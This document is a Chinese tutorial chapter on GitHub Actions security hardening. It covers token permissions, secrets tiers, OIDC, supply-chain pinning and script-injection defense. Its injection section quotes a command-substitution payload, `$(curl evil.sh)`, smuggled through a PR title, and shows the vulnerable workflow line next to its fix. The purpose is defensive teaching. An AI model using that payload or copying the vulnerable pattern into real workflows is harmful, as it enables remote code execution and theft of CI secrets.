# 06-安全工程：权限、密钥与 OIDC

> 定位：CI 的权限是"越权即泄漏"的高危区——GITHUB_TOKEN 能推代码、secrets 能进日志、第三方 Action 是供应链入口。本篇给出安全基线四层：最小权限、secrets 分层、OIDC 免密钥、供应链防护，配 2026 新能力（OIDC 自定义属性 GA）。

## 1. 最小权限模型：GITHUB_TOKEN

每次运行平台注入一个 `GITHUB_TOKEN`，其权限由 `permissions` 控制——这是工作流安全的第一道闸：

- **默认值演变**：2023-02 起新仓库默认只读（`read-all`）；存量老仓库默认写权限，必须显式收紧。
- **语法**：工作流级（`on` 同级）或 job 级（job 内覆盖）：

```yaml
permissions:
  contents: read        # 代码读取（checkout 需要）
  checks: write         # 状态检查上报（门禁需要）
  pull-requests: write  # PR 评论（机器人场景）
  id-token: write       # OIDC 令牌（仅需要云凭证的 job 才开！）
  packages: write       # 推送容器镜像才开
```

**原则**：只声明实际用到的 scope；`id-token: write` 是 OIDC 的钥匙，只放在需要云凭证的 job 里；内容发布类 job（release）单独放宽并配合环境保护。

## 2. Secrets 分层与管理

secrets 是加密存储的密钥，有三个层级，**环境级 > 组织级 > 仓库级**，同键名时优先级高的覆盖：

- **仓库级**：`Settings → Secrets and variables → Actions`，仅该仓库可见。
- **组织级**：全 org 仓库可用（如云厂商账号 ID、统一构建 token），支持"所选仓库"限定。
- **环境级**：挂在 `environment` 下，配合**部署保护规则**（required reviewers、等待计时、自定义规则）——生产 secrets 的访问受"人"的审批控制，这是"生产密钥只能被生产 job 读"的机制实现。

**secrets 的加密机制**：secrets 在 GitHub 端用 libsodium sealed box 加密存储，只在注入 Runner 环境时解密为环境变量——平台侧看不到明文，工作流文件里也永远看不到值（只能写 `${{ secrets.X }}`）。理解这个机制才有正确的安全姿势：秘密的暴露面只有"运行中的 job 环境"与"日志"两个点——所以防护也集中在这两点（环境隔离 + 日志纪律）。

**secrets 使用纪律**：① 日志不可见是平台保证（`***` 脱敏），但**禁止 echo secrets.X 进日志**（echo 拼接时可能绕过脱敏）；② secrets 不进 `with` 明文输入（会在 UI 显示），要用 `env` 传；③ 密钥轮换要有周期（季度/半年度）与泄露应急预案（吊销 + 轮换 + 审计）；④ 明文配置（构建号、版本）走 `vars`，密钥永远走 `secrets`——把分类规则写进团队规范（09 篇）。

**真实攻击案例（为什么这套防线存在）**：历史上多次知名事件——恶意 PR 通过 `pull_request_target` 触发的工作流读取目标分支 secrets 后外传（对策：pull_request_target 场景永不把 PR 内容拼进执行逻辑）；被投毒的第三方 Action 在更新后窃取仓库 token（对策：pin SHA）；fork 仓库利用 GITHUB_TOKEN 的写权限向原仓库推送（对策：permissions 最小化 + fork 触发限制）。这些案例的共同教训：**CI 安全不是"配置一次"而是"默认不信"**——默认只读、默认隔离、默认 pin，需要时才放开。

**pull_request_target 的攻击链（面试深度题）**：该事件让工作流在**目标分支**的代码上运行——恶意 PR 若能控制工作流执行的代码路径（如 PR 修改了被该事件引用的工作流文件本身、或 PR 内容被拼进 run 命令），就拿到了目标分支的 secrets 与 token 权限。防护的完整姿势是"三不"：其一，**不把 PR 内容拼进命令**（改动文件路径、PR 标题都经 env 中转且只读引用）；其二，**不 checkout PR 的代码**（该事件的意义就是跑目标分支代码，需要 PR 代码用安全方式单独检出到临时目录）；其三，**工作流文件本身不随 PR 变更生效**（默认机制——`pull_request` 事件才用 PR 里的工作流，target 用目标分支的）。把这三条讲清楚，安全面试这一题就稳了。安全基线十条是"照抄级"清单，但清单的归宿是"内化为每次写工作流的默认姿势"——安全不是事后加固，而是与功能同步设计的组成部分。

## 3. OIDC：从长效密钥到短期凭据

传统姿势：把云厂商的 Access Key / SSH 密钥放进 secrets——密钥长期有效，一旦泄漏波及面巨大。OIDC 姿势：工作流向 GitHub 请求一个**短期令牌**，云厂商验证令牌签名后直接签发临时凭据（15 分钟级），**仓库里不存任何长效云密钥**：

```yaml
permissions:
  id-token: write          # 关键：申请 OIDC 令牌
  contents: read

jobs:
  deploy:
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/ci-deploy
          aws-region: cn-north-1
```

**信任策略**（云厂商侧）限定"哪个仓库、哪个 ref、哪个环境可以扮演哪个角色"——`sub` claim 携带 `repo:owner/name:ref:refs/heads/main`。**2026-04 OIDC 自定义属性 GA**：token 可携带仓库自定义属性（组织分类：环境类型、团队归属、合规等级）作为 claims，信任策略从"按仓库"细化到"按业务分类"——多环境多团队的信任矩阵从此可维护。

**OIDC vs 密钥的取舍**：OIDC 免运维密钥、天然短期、可审计，但配置门槛高（云厂商 IAM 信任策略是知识盲区）；小项目单仓库用密钥可接受，多团队/多环境/合规敏感场景 OIDC 是唯一正确解。

## 4. 第三方 Action 供应链防护

市场 Action 是供应链攻击的主要入口（历史上多起知名 Action 被投毒事件），防线四层：

1. **pin SHA**：第三方 Action 用 commit SHA 引用，Dependabot 自动更新 PR（05 篇）。
2. **许可来源评估**：只装"官方 / 高信誉 / 源码可读"三类的 Action；下载量低、久未维护的直接排除。
3. **运行隔离**：不可信输入（PR 事件）的 job 与生产 job 分工作流跑；`pull_request_target` 场景绝不把 PR 内容拼进 shell。
4. **供应链审计**：企业级用依赖审计工具（Dependabot alerts 覆盖 Action 依赖 + GitHub Advisory Database 联动）；SBOM 生成纳入发布流程（07 篇衔接）。

## 5. 脚本注入防护（最易被忽视的洞）

攻击链路：`${{ github.event.pull_request.title }}` 这类**不可信输入**被求值后拼进 `run:` 命令 → 恶意内容（如 `$(curl evil.sh)`)被执行。

```yaml
# 危险写法：PR 标题直接进 shell
run: echo "Reviewing ${{ github.event.pull_request.title }}"

# 安全写法：先赋给环境变量（求值时无害化），shell 里只引用变量
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "Reviewing $PR_TITLE"
```

规则一句话：**凡来自事件载荷/输入的字符串，一律经 env 中转，禁止直接拼接进 `run` 与 `eval`**；同理 `github.actor`、`inputs.*` 全部按不可信处理。

### 5.1 环境保护规则的细节

环境的部署保护规则是"生产密钥的人为闸门"，规则可以叠加：**required reviewers**（指定人员审批后 job 才运行，审批人是"人肉门禁"）、**等待计时**（审批通过后延迟生效，给回滚留窗口）、**自定义保护规则**（组织级配置，脚本化校验如"必须来自受信 Runner 组"）。注意三个边界：其一，审批的是一次运行而非一次部署——同一次运行里多个 job 挂同一环境，审批通过后全部放行，设计时把"一个环境一个部署 job"作为惯例；其二，`deployment: false` 的环境不产生部署记录（02 篇），但保护规则照常生效——"预检查环境"用这个键最合适；其三，环境保护规则的审批人与操作审计是企业合规（SOC2 类）的常见要求，审批记录在环境页面可查，审计时截图留证。

### 6.1 安全基线落地清单（照抄级）

1. 每个工作流显式声明 `permissions`，不依赖默认值。
2. `id-token: write` 只出现在需要 OIDC 的 job。
3. secrets 按"环境 > org > repo"三层放置，季度轮换。
4. 云凭证全部走 OIDC，仓库内零长效密钥。
5. 第三方 Action pin SHA + Dependabot 自动更新。
6. 不可信输入（事件载荷/inputs）一律经 env 中转。
7. `pull_request_target` 列入 review 重点，禁止拼 PR 内容进命令。
8. 环境挂部署保护规则，生产环境强制 required reviewers。
9. 自托管 Runner 分组隔离，生产组与不可信代码组物理分开。
10. 供应链审计：SBOM 附制品 + Dependabot alerts 清零目标。

## 6. 环境与分支保护组合（安全拓扑）

完整的安全拓扑是三层组合：**分支保护**（谁改代码——required reviews/checks 拦非受信合并）→ **环境保护**（谁触发部署——required reviewers 拦非授权部署）→ **Runner 隔离**（代码跑在哪——自托管分组，见 04 篇）。三层缺一不可：只做分支保护，恶意 PR 仍可经 `pull_request_target` 拿到环境 secrets；只做环境保护，受信分支上的供应链投毒 Action 仍可部署。

> 🎯 核心要点：CI 安全四句话——**权限声明最小化、secrets 分层 + 轮换、云凭证走 OIDC、不可信输入过 env**。2026 年新增的 OIDC 自定义属性把"按仓库信任"升级为"按业务分类信任"，合规审计场景必须用上。

---

**下一模块**：[07-缓存与制品](./07-缓存与制品.md) / **返回总览**：[00-GitHub Actions 知识体系总览](./00-GitHub%20Actions%20知识体系总览.md)

**参考来源**：

- [OIDC custom attributes for GitHub Actions (GA) | GitHub Changelog 2026-04-02](https://github.blog/changelog/2026-04-02-github-actions-early-april-2026-updates/)
- [Security hardening for GitHub Actions | GitHub Docs](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Using secrets in GitHub Actions | GitHub Docs](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions)
- [About security hardening with OpenID Connect | GitHub Docs](https://docs.github.com/en/actions/security-guides/about-security-hardening-with-openid-connect)
